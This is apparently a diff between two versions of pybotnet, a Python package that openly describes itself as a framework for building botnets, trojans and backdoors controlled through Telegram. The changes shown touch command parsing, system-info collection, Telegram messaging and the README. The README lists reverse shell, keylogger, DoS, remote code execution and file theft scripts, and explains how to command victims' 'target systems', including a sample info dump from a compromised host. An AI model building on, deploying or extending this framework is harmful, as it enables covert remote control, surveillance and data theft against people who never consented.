     `[mac-address] [pid] /[SCRIPT-NAME] [params]`
         Example:
-            `{str(uuid.getnode())} {str(os.getpid())} /echo hi`
-            `{str(uuid.getnode())} {str(os.getpid())} /who`
+            `{str(uuid.getnode())} {str(os.getpid())} /echo Hi`
 
+    + Option 5:
     `[mac-address] [BOT-NAME] /[SCRIPT-NAME] [params]`
         Example:
-            `{str(uuid.getnode())} {self.BOT_NAME} /echo hi`
-            `{str(uuid.getnode())} {self.BOT_NAME} /who`
+            `{str(uuid.getnode())} {self.BOT_NAME} /echo Hi`
+
+    + Option 6:
+    `[mac-address] [BOT-NAME] [pid] /[SCRIPT-NAME] [params]`
+        Example:
+            `{str(uuid.getnode())} {self.BOT_NAME} {str(os.getpid())} /echo Hi`
 
 
 # PyBotNet version: {__version__}
 # Docs: {__github_link__}
 """
         if script_name:
             if script_name in ["help", "start"]:
@@ -214,18 +215,18 @@
         else:
             is_cache, data = self._get_cache("full_system_info")
             if is_cache:
                 data.update({"from cache": True})
                 return data
 
         minimal_info = {
-            "scripts_name": list(self.scripts),
+            "bot_name": self.BOT_NAME,
             "mac_addres": uuid.getnode(),
             "pid": os.getpid(),
-            "bot_name": self.BOT_NAME,
+            "scripts_name": list(self.scripts),
             "os": platform.system(),
             "global_ip": get_global_ip(),
         }
 
         if minimal:
             # save cache minimal
             self._add_cache("minimal_system_info", 30, minimal_info)
@@ -285,17 +286,14 @@
 
             # stop signal
             if Context.get_global_value("BotNet__stop_background_thread_signal"):
                 return
 
             try:
                 command = self.engine.receive()
-            except EngineException as e:
-                _logger.debug(f"Engine[{self.engine}] Error: {e}")
-                command = False
 
             except Exception as e:
                 _logger.debug(f"Engine[{self.engine}] Error: {e}")
                 command = False
 
             # check for mac_addres, self.BOT_NAME or PID
             if self._valid_command(command, expected_length=2):
```

### Comparing `pybotnet-2.2.3/pybotnet/context.py` & `pybotnet-2.2.4/pybotnet/context.py`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/pybotnet/engines/base_engine.py` & `pybotnet-2.2.4/pybotnet/engines/base_engine.py`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/pybotnet/engines/telegram_engine.py` & `pybotnet-2.2.4/pybotnet/engines/telegram_engine.py`

 * *Files 16% similar despite different names*

```diff
@@ -2,15 +2,14 @@
 import logging
 import urllib
 import json
 import os
 
 from .base_engine import BaseEngine
 
-from ..exceptions import EngineException
 from ..utils import proxy, upload_server
 import requests
 
 _logger = logging.getLogger(f"--> {__name__}  ")
 
 
 class TelegramEngine(BaseEngine):
@@ -42,54 +41,56 @@
             if admin_command and not self._is_first_run:
                 return admin_command.strip().split(" ")
 
             self._is_first_run = False
             return False
 
         except Exception as e:
-            _logger.debug(f"receive: error {e}")
-            raise EngineException(e)
+            _logger.debug(f"receive: error {type(e)}:{e}")
+            return False
 
     def send(
         self,
         message: str,
         additionalـinfo: dict = {},
         reply_to_last_message: bool = False,
     ) -> bool:
         if type(additionalـinfo) != dict:
             additionalـinfo = {"additionalـinfo": additionalـinfo}
 
         if len(additionalـinfo) > 0:
             additionalـinfo_str = ""
+
             for k, v in additionalـinfo.items():
                 additionalـinfo_str += f"\n{k}: {v}"
+
             additionalـinfo_str += f"\nuse_proxy: {self._use_proxy}"
             message = f"{message}\n\n___________________________{additionalـinfo_str}"
 
         message = urllib.parse.quote(message, safe=" ")
 
         res = []
-        split_message = []  # split message to avoid telegram error
+        splited_message = []  # split message to avoid telegram error
         for i in range(0, len(message), 4096):
-            split_message.append(message[i : i + 4096])
+            splited_message.append(message[i : i + 4096])
 
-        for msg in split_message:
+        for msg in splited_message:
             try:
                 api_url = f"https://api.telegram.org/bot{self.token}/SendMessage?chat_id={self.admin_chat_id}&text={msg}"
 
                 if self._last_admin_message_id and reply_to_last_message:
                     api_url = (
                         f"{api_url}&reply_to_message_id={self._last_admin_message_id}"
                     )
 
                 res.append(self._http_request(method="POST", url=api_url))
 
             except Exception as e:
-                _logger.debug(f"send: error {e}")
-                raise EngineException(e)
+                _logger.debug(f"send: error: {type(e)}:{e}")
+                return None
 
         return res[0]
 
     def send_file(self, file_route: str, additionalـinfo: dict = {}) -> bool:
         try:
             is_true, res = upload_server.make_zip_file(file_route)
             if not is_true:
@@ -124,25 +125,34 @@
         else:
             self._use_proxy = True
             res = proxy.http_request(method=method, url=url, timeout=timeout)
 
             if res == False:
                 return False
 
-            return json.loads(res.replace("edited_message", "message")).get(
-                "result", False
-            )
+            elif "(401) Unauthorized" in str(res):
+                _logger.debug(f"Invalied Telegram Bot Token                     <--- Error")
+                return False
+
+            try:
+                return json.loads(res.replace("edited_message", "message")).get("result", False)
+            except:
+                _logger.debug(f"invalied json response: {res}")
+                return False
 
     def _getme(self):
         try:
-            res = requests.get(
-                f"https://api.telegram.org/bot{self.token}/getMe", timeout=0.5
-            )
+            res = requests.get(f"https://api.telegram.org/bot{self.token}/getMe", timeout=1)
+
             if res.status_code == 200:
                 return res.json()
+
+            elif res.status_code == 401:
+                _logger.debug(f"getMe: Invalied Telegram Bot Token:             <--- Error")
+
             return False
 
         except:
             return False
 
     def _last_admin_message(self, response: List[Dict[str, Any]]) -> str:
         """extract last admin message and remove previous messages"""
```

### Comparing `pybotnet-2.2.3/pybotnet/engines/test_engine.py` & `pybotnet-2.2.4/pybotnet/engines/test_engine.py`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/pybotnet/scripts/dos.py` & `pybotnet-2.2.4/pybotnet/scripts/dos.py`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/pybotnet/scripts/get_file.py` & `pybotnet-2.2.4/pybotnet/scripts/get_file.py`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/pybotnet/scripts/keylogger.py` & `pybotnet-2.2.4/pybotnet/scripts/keylogger.py`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/pybotnet/scripts/openurl.py` & `pybotnet-2.2.4/pybotnet/scripts/openurl.py`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/pybotnet/scripts/put_file.py` & `pybotnet-2.2.4/pybotnet/scripts/put_file.py`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/pybotnet/scripts/reverse_shell.py` & `pybotnet-2.2.4/pybotnet/scripts/reverse_shell.py`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/pybotnet/scripts/runcode.py` & `pybotnet-2.2.4/pybotnet/scripts/runcode.py`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/pybotnet/scripts/scheduler.py` & `pybotnet-2.2.4/pybotnet/scripts/scheduler.py`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/pybotnet/scripts/screenshot.py` & `pybotnet-2.2.4/pybotnet/scripts/screenshot.py`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/pybotnet/scripts/who.py` & `pybotnet-2.2.4/pybotnet/scripts/who.py`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/pybotnet/utils/serializer.py` & `pybotnet-2.2.4/pybotnet/utils/serializer.py`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/pybotnet/utils/third_party_proxy/httpdebugger.py` & `pybotnet-2.2.4/pybotnet/utils/third_party_proxy/httpdebugger.py`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/pybotnet/utils/upload_server.py` & `pybotnet-2.2.4/pybotnet/utils/upload_server.py`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/pybotnet/utils/utils.py` & `pybotnet-2.2.4/pybotnet/utils/utils.py`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/pybotnet.egg-info/PKG-INFO` & `pybotnet-2.2.4/pybotnet.egg-info/PKG-INFO`

 * *Files 8% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: pybotnet
-Version: 2.2.3
+Version: 2.2.4
 Summary: A Python framework for building remote control, botnet , trojan or backdoor with Telegram or other control panels
 Home-page: https://github.com/onionj/pybotnet
 Author: onionj
 Author-email: onionj98@gmail.com
 License: gpl-3.0
 Keywords: onionj pybotnet,python remote control,python trojan,python backdoor,python botnet,pybotnet,python ddos,python backdoor,python trojan,reverse shell,python keyloggerframework
 Platform: UNKNOWN
@@ -46,15 +46,15 @@
 **Documentation**: <a href="https://onionj.github.io/pybotnet/" target="_blank">https://onionj.github.io/pybotnet/</a>
 
 **ToDo List**: <a href="https://github.com/users/onionj/projects/1" target="_blank">https://github.com/users/onionj/projects/1</a>
 
 ---
 
 ### Features:
-* Built in Telegram control pannel and proxy
+* Built in Telegram control pannel and proxy system
 * Built in scripts like:
     * reverse shell
     * put or get file
     * run python code on target systems
     * get screenshot
     * keylogger
     * dos
@@ -105,15 +105,15 @@
 
 ```console 
 python3 main.py
 ```
 
 #### telegram engine
 
-open telegram and send `/who` to your bot; If you have done the steps correctly, you recive message like this:
+open telegram and send `/who` command to your bot; If you have done the steps correctly, you recive a message like this:
 
 ```
 scripts_name:
     echo
     who
     shell
     screenshot
@@ -137,15 +137,15 @@
 pid: 148352
 cpu_count: 8
 pybotnet_version: 2.0.8b0
 from cache: True
 ```
 
 
-you can send `/help` to see help page, or send `/help <script_name>` to recive more help about specific script.
+you can send `/help` to see help page, or send `/help <script_name>` to recive more help about a specific script.
 
 for example send `/help screenshot`, You will receive:
 
 ```
 NAME:
 screenshot
 
@@ -171,28 +171,29 @@
 os: Linux
 global_ip: 5.10.30.35
 country: Iran, Islamic Republic of
 bot_name: no_name
 use_proxy: False
 ```
 
-in top of message you see script name, description, syntax and examples.
+in top of message you see script name, description, syntax, and examples.
 
 for run screenshot script you have two choice:
 
 * Run the script on all clients that are listening to Telegram bot (for now we have one!)
 * Run script on one specific system
 
 for run script on all client send `/screenshot`.
 
-bot if you need get screen shot on specific system you need send `[mac_addres] /screenshot` for our case: `228362405364 /screenshot`
+bot if you need to get screen-shot on a specific system you need to send `[mac_addres] /screenshot` for our case: `228362405364 /screenshot`
 
 in some case like `/shell` you need to run it just for one system.
 
 
+For see who we can `Add custom scripts`, `Run in background`, `Running the pybotnet without coding`, and etc, see the below documentation.
 
 ### *For more, see [Documentation](https://onionj.github.io/pybotnet/)*
 
 
 ---
 
 ## Contributors ✨
```

#### html2text {}

```diff
@@ -1,8 +1,8 @@
-Metadata-Version: 2.1 Name: pybotnet Version: 2.2.3 Summary: A Python framework
+Metadata-Version: 2.1 Name: pybotnet Version: 2.2.4 Summary: A Python framework
 for building remote control, botnet , trojan or backdoor with Telegram or other
 control panels Home-page: https://github.com/onionj/pybotnet Author: onionj
 Author-email: onionj98@gmail.com License: gpl-3.0 Keywords: onionj
 pybotnet,python remote control,python trojan,python backdoor,python
 botnet,pybotnet,python ddos,python backdoor,python trojan,reverse shell,python
 keyloggerframework Platform: UNKNOWN Classifier: License :: OSI Approved :: GNU
 Lesser General Public License v3 or later (LGPLv3+) Classifier: Programming
@@ -16,49 +16,51 @@
        [https://img.shields.io/pypi/v/pybotnet?label=pybotnet] [https://
  img.shields.io/github/license/onionj/pybotnet] [https://img.shields.io/pypi/
                              pyversions/pybotnet]
 > Disclaimer: Please note that this is a research project. I am by no means
 responsible for any usage of this tool. Use it on your behalf!. --- **Source
 Code**: https://github.com/onionj/pybotnet **Documentation**: https://
 onionj.github.io/pybotnet/ **ToDo List**: https://github.com/users/onionj/
-projects/1 --- ### Features: * Built in Telegram control pannel and proxy *
-Built in scripts like: * reverse shell * put or get file * run python code on
-target systems * get screenshot * keylogger * dos * scheduler * ... * Cross
-platform * Ability to easily add custom scripts * Import external scripts *
-Ability to add custom control panel * Add remote control to your apps * [...]
+projects/1 --- ### Features: * Built in Telegram control pannel and proxy
+system * Built in scripts like: * reverse shell * put or get file * run python
+code on target systems * get screenshot * keylogger * dos * scheduler * ... *
+Cross platform * Ability to easily add custom scripts * Import external scripts
+* Ability to add custom control panel * Add remote control to your apps * [...]
 (https://onionj.github.io/pybotnet/) ### Install PyBotNet ```console pip3
 install pybotnet -U ``` * `-U`: make sure to upgrade framework to latest
 version. #### The simplest PyBotNet file could look like this: ```py
 title="main.py" # in main.py from pybotnet import BotNet, TelegramEngine
 telegram_engine = TelegramEngine(token=TELEGRAM_TOKEN,
 admin_chat_id=ADMIN_CHAT_ID) #(1) botnet = BotNet(telegram_engine) # (2)
 botnet.run() ``` 1. create engine: Engines transfer messages between admin and
 botnet 2. create BotNet instance #### note: * `TELEGRAM_TOKEN`: You can use
 telegram `@botfather` to Create new telegram API Bot and get your
 `TELEGRAM_TOKEN` * `ADMIN_CHAT_ID`: Get it from @userinfobot telegram bot *
 PyBotNet include default scripts, like: `/shell`, `/put_file`, `/get_file`, `/
 screenshot`, `/who`, ..., you can send `/help` to your telegram bot and see
 more detail.. #### Run code: ```console python3 main.py ``` #### telegram
-engine open telegram and send `/who` to your bot; If you have done the steps
-correctly, you recive message like this: ``` scripts_name: echo who shell
-screenshot put_file get_file runcode openurl dos schedule mac_addres:
+engine open telegram and send `/who` command to your bot; If you have done the
+steps correctly, you recive a message like this: ``` scripts_name: echo who
+shell screenshot put_file get_file runcode openurl dos schedule mac_addres:
 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic Republic of
 bot_name: no_name local_ip: {'192.168.23.1'} host_name: {'system_name'}
 system_user: root up_time: 0:00:01 current_route: / pid: 148352 cpu_count: 8
 pybotnet_version: 2.0.8b0 from cache: True ``` you can send `/help` to see help
-page, or send `/help ` to recive more help about specific script. for example
+page, or send `/help ` to recive more help about a specific script. for example
 send `/help screenshot`, You will receive: ``` NAME: screenshot DESCRIPTION:
 get screen shot * `[mac-address] /screenshot` or * `/screenshot` example
 command: * `94945035671481 /screenshot` * `/screenshot` return: img or img-
 download-link script_version: 0.0.1 default_script: True
 ___________________________ scripts_name: ['echo', 'who', 'shell',
 'screenshot', 'put_file', 'get_file', 'runcode', 'openurl', 'dos', 'schedule']
 mac_addres: 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic
 Republic of bot_name: no_name use_proxy: False ``` in top of message you see
-script name, description, syntax and examples. for run screenshot script you
+script name, description, syntax, and examples. for run screenshot script you
 have two choice: * Run the script on all clients that are listening to Telegram
 bot (for now we have one!) * Run script on one specific system for run script
-on all client send `/screenshot`. bot if you need get screen shot on specific
-system you need send `[mac_addres] /screenshot` for our case: `228362405364 /
-screenshot` in some case like `/shell` you need to run it just for one system.
+on all client send `/screenshot`. bot if you need to get screen-shot on a
+specific system you need to send `[mac_addres] /screenshot` for our case:
+`228362405364 /screenshot` in some case like `/shell` you need to run it just
+for one system. For see who we can `Add custom scripts`, `Run in background`,
+`Running the pybotnet without coding`, and etc, see the below documentation.
 ### *For more, see [Documentation](https://onionj.github.io/pybotnet/)* --- ##
 Contributors â¨ Thanks goes to these wonderful people :
```

### Comparing `pybotnet-2.2.3/pybotnet.egg-info/SOURCES.txt` & `pybotnet-2.2.4/pybotnet.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `pybotnet-2.2.3/setup.py` & `pybotnet-2.2.4/setup.py`

 * *Files identical despite different names*

